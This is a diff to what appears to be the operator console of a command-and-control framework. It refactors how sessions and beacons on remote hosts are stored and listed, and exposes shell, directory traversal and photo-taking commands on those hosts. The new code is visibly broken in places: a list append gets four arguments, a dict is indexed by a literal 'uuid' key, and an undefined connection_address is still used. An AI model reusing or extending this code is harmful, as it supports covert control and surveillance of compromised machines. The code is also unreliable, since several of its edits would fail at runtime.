@@ -10,12 +10,12 @@ from ServerDatabase.database import DatabaseClass
 from .beacon_commands import BeaconCommandsClass
 from .global_objects import (
     remove_connection_list,
-    sessions,
+    sessions_list,
     send_data,
     receive_data,
     config,
     tab_completion,
-    beacons,
+    beacon_list,
     remove_beacon_list,
     add_beacon_command_list
 )
@@ -57,12 +57,11 @@ class MultiHandlerCommands:
         'netstat', 'diskusage', 'listdir'])
         """
         def handle_beacon():
-            for i, details in enumerate(sessions["details"]):
-                if details == conn:
-                    if sessions["uuid"][i] == user_ID:
-                        self.sessioncommands.change_beacon(
-                            conn, r_address, sessions["uuid"][i])
-                return
+            for userID, session in beacon_list.items():
+                if session.uuid == user_ID:
+                    self.sessioncommands.change_beacon(
+                        conn, r_address, session.uuid)
+            return
 
         command_handlers = {
             "shell": lambda: self.sessioncommands.shell(
@@ -135,17 +134,13 @@ class MultiHandlerCommands:
         'netstat', 'diskusage', 'listdir', directoryTraversal', 'takePhoto'])
         """
         def handle_session():
-            for i, details in enumerate(beacons["uuid"]):
-                if details == UserID:
-                    if beacons["uuid"][i] == UserID:
-                        print(colorama.Fore.GREEN +
-                              "Beacon will change to session mode"
-                              " after the next callback")
-                        # send session command to beacon
-                        add_beacon_command_list(UserID, "session")
-                        # remove the beacon from the list
-                        remove_beacon_list(beacons["uuid"][i])
-                return
+            if beacon_list["uuid"]:
+                print(colorama.Fore.GREEN +
+                      "Beacon will change to session mode" +
+                      " after the next callback")
+                add_beacon_command_list(UserID, "session")
+                remove_beacon_list(beacon_list["uuid"])
+            return
 
         command_handlers = {
             "shell": lambda: self.beaconCommands.shell(UserID, IPAddress),
@@ -157,7 +152,8 @@ class MultiHandlerCommands:
             "netstat": lambda: self.beaconCommands.netstat(UserID),
             "session": handle_session,
             "commands": lambda: self.beaconCommands.list_db_commands(UserID),
-            "directorytraversal": lambda: self.beaconCommands.dir_traversal(UserID),
+            "directorytraversal": lambda: self.beaconCommands.dir_traversal(
+                UserID),
             "takephoto": lambda: self.beaconCommands.takePhoto(UserID)
         }
 
@@ -194,39 +190,39 @@ class MultiHandlerCommands:
         List all active connections stored in the global objects variables
         """
         # Sessions table
-        if len(sessions["address"]) == 0:  # no connections
+        if len(sessions_list) == 0:
             print(colorama.Fore.RED + "No Active Sessions")
         else:
             print("Sessions:")
             table = []
-            for i in range(len(sessions["address"])):
-                table.append([
-                    sessions['uuid'][i],
-                    sessions['hostname'][i],
-                    sessions['address'][i],
-                    sessions['operating_system'][i]
-                ])
+            for userID, session in sessions_list.items():
+                table.append(
+                    userID,
+                    session.hostname,
+                    session.address,
+                    session.operating_system
+                )
             print(colorama.Fore.WHITE + tabulate(
                 table, headers=["UUID", "Hostname", "Address", "OS"],
                 tablefmt="grid"))
 
         # Beacons table
-        if len(beacons["address"]) == 0:
+        if len(beacon_list) == 0:
             print(colorama.Fore.RED + "No Active Beacons")
         else:
             print("Beacons:")
             table = []
-            for i in range(len(beacons["address"])):  # print beacons
+            for userID, beacon in beacon_list.items():
                 row = [
-                    beacons['hostname'][i],
-                    beacons['operating_system'][i],
-                    beacons['address'][i],
-                    beacons['uuid'][i],
-                    beacons['last_beacon'][i]
+                    beacon.hostname,
+                    beacon.operating_system,
+                    beacon.address,
+                    beacon.uuid,
+                    beacon.last_beacon
                 ]
                 try:
                     next_beacon_time = time.strptime(
-                        beacons["next_beacon"][i], "%a %b %d %H:%M:%S %Y")
+                        beacon.next_beacon, "%a %b %d %H:%M:%S %Y")
                     current_time = time.strptime(
                         time.asctime(), "%a %b %d %H:%M:%S %Y")
 
@@ -234,14 +230,14 @@ class MultiHandlerCommands:
                             next_beacon_time):
                         time_diff = time.mktime(current_time) - time.mktime(
                             next_beacon_time)
-                        if time_diff < beacons["jitter"][i]:
-                            row.append(f"Expected Callback was {beacons['next_beacon'][i]}. It is {int(time_diff)} seconds late. (Within Jitter)") # noqa
+                        if time_diff < beacon.jitter:
+                            row.append(f"Expected Callback was {beacon.next_beacon}. It is {int(time_diff)} seconds late. (Within Jitter)") # noqa
                             row_color = colorama.Fore.YELLOW
                         else:
-                            row.append(f"Expected Callback was {beacons['next_beacon'][i]}. It is {int(time_diff)} seconds late") # noqa
+                            row.append(f"Expected Callback was {beacon.last_beacon}. It is {int(time_diff)} seconds late") # noqa
                             row_color = colorama.Fore.RED
                     else:
-                        row.append(f"Next Callback expected {beacons['next_beacon'][i]} in {int(time.mktime(next_beacon_time) - time.mktime(current_time))} seconds") # noqa
+                        row.append(f"Next Callback expected {beacon.next_beacon} in {int(time.mktime(next_beacon_time) - time.mktime(current_time))} seconds") # noqa
                         row_color = colorama.Fore.WHITE
                 except ValueError:
                     row.append("Awaiting first call")
@@ -259,17 +255,21 @@ class MultiHandlerCommands:
         """allows interaction with individual session,
             passes connection details through to the current_client function"""
         try:
-            if len(sessions["uuid"]) == 1:
+            if len(sessions_list) == 1:
+                session = list(sessions_list.values())[0]
                 self.current_client_session(
-                    sessions["details"][0],
-                    sessions["address"][0],
-                    sessions["uuid"][0])
+                    session.conn,
+                    session.address,
+                    session.uuid
+                )
             else:
                 data = int(input("What client? "))
+                session = list(sessions_list.values())[data]
                 self.current_client_session(
-                    sessions["details"][data],
-                    sessions["address"][data],
-                    sessions["uuid"][data])
+                    session.conn,
+                    session.address,
+                    session.uuid
+                )
         except (IndexError, ValueError):
             print(
                 colorama.Fore.WHITE +
@@ -304,7 +304,7 @@ class MultiHandlerCommands:
                     print(colorama.Back.RED + str(e))
                 error = True
                 pass
-        sessions.clear()
+        sessions_list.clear()
         if not error:
             print(
                 colorama.Back.GREEN +
@@ -321,9 +321,10 @@ class MultiHandlerCommands:
         try:
             # socker to close
             data = int(input("What client do you want to close? "))
+            session = list(sessions_list.values())[data]
             self.sessioncommands.close_connection(
-                sessions.connection_details[data],
-                sessions.connection_address[data])
+                session.connection_details,
+                session.connection_address)
             remove_connection_list(
                 connection_address[data])  # removes data from lists
             print(colorama.Back.GREEN + "Connection Closed")  # success message
